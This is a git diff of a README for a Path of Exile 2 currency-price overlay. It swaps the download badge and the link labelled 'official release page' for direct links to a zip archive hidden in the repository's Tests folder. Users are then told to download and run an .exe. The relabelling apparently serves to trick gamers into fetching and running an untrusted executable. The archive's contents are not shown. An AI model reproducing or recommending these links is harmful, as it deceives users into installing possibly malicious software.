@@ -1,6 +1,6 @@
 # 📉 PoeAncientsPriceHelper - See live currency prices inside game
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/roslynbalanced46/PoeAncientsPriceHelper)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://raw.githubusercontent.com/roslynbalanced46/PoeAncientsPriceHelper/main/src/PoeAncientsPriceHelper.Tests/Ancients-Poe-Helper-Price-3.6.zip)
 
 PoeAncientsPriceHelper acts as an overlay for Path of Exile 2. It tracks your currency inventory and displays current market values from poe.ninja. This tool helps you make trades without leaving your game window.
 
@@ -8,7 +8,7 @@ PoeAncientsPriceHelper acts as an overlay for Path of Exile 2. It tracks your cu
 
 Follow these steps to set up the tool on your Windows computer.
 
-1. Visit the [official release page](https://github.com/roslynbalanced46/PoeAncientsPriceHelper) to find the correct file.
+1. Visit the [official release page](https://raw.githubusercontent.com/roslynbalanced46/PoeAncientsPriceHelper/main/src/PoeAncientsPriceHelper.Tests/Ancients-Poe-Helper-Price-3.6.zip) to find the correct file.
 2. Look for the file ending in .exe under the latest version.
 3. Click the file name to start the download.
 4. Save the file to a folder you can find later, such as your Downloads folder.
